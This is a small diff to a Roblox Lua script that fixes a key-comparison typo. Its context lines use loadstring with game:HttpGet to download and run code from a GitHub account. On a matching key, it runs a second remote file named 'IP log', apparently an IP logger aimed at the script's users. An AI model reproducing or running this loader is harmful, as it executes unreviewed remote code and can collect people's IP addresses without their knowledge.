@@ -1,6 +1,6 @@
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/Fykas7077/Fykas7077/main/Key'),true))()
 
-if _G.key = _G.Key then
+if _G.key == _G.Key then
 	loadstring(game:HttpGet(('https://github.com/Fykas7077/Fykas7077/blob/main/IP%20log'),true))()
 	else
 	print("no key...")
